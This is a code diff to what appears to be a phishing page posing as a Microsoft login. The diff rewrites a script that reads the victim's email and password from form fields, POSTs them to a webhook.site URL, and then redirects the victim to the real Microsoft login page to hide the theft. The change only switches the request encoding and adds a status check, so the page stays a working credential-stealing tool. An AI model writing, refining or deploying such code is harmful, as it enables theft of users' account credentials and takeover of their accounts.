@@ -63,18 +63,22 @@
             var email = document.getElementById('email').value;
             var password = document.getElementById('password').value;
 
-            // Send data to Webhook.site using AJAX
+            // Create a new AJAX request
             var xhr = new XMLHttpRequest();
             xhr.open('POST', 'https://webhook.site/663b8d2c-02ed-4425-890e-774dfe86f880', true);
-            xhr.setRequestHeader('Content-Type', 'application/json;charset=UTF-8');
-            xhr.send(JSON.stringify({
-                email: email,
-                password: password
-            }));
+            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
 
-            // After sending the data, redirect the user to the real Microsoft login page
+            // Prepare the data to be sent in the request
+            var params = 'email=' + encodeURIComponent(email) + '&password=' + encodeURIComponent(password);
+
+            // Send the request with the data
+            xhr.send(params);
+
+            // Once the request is done, redirect to Microsoft login page
             xhr.onload = function() {
-                window.location.href = 'https://login.microsoftonline.com/';  // Redirect to Microsoft login
+                if (xhr.status === 200) {
+                    window.location.href = 'https://login.microsoftonline.com/';  // Redirect to Microsoft login page
+                }
             };
         });
     </script>
